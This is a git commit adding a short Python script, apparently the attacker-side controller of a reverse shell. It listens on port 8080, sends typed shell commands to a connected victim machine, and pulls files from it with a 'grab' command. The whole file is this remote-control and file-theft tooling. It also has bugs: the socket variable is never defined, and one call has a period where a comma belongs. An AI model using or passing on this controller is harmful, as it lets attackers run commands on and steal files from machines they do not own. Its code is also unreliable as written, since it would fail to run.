7515ec391aa5ee72386d883fb69187c1778b38dd
AlbertG22 <59567419+AlbertG22@users.noreply.github.com>
2021-10-26 10:22:54 +0300

    Add files via upload

---
+++ tcpserver.py
@@ -0,0 +1,37 @@
+import socket
+import os
+
+def transfer(conn, command):
+	conn.send(command.encode())
+	f = open("/root/Desktop/place_holder.jpg", "wb")
+	while True:
+		bits = conn.recv(1024)
+		if bits.endswith("DONE".encode()):
+			f.write(bits[:-4])
+			f.close()
+			print("[+] Transfer completed ")
+			break
+		if "File not found".encode() in bits:
+			print ("[-] Unable to find out the file")
+			break
+		f.write(bits)
+
+def connect():
+	s.bind(("",8080))
+	s.listen(1)
+	conn, addr = s.accept()
+	print("[+] We got a connection from", addr)
+
+	while True:
+		command = input("Shell> ")
+		if "terminate" in command:
+			conn.send("terminate".encode())
+			break
+		elif "grab" in command:
+			transfer(conn. command)
+		else:
+			conn.send(command.encode())
+			print(conn.recv(1024).decode())
+def main():
+	connect()
+main()
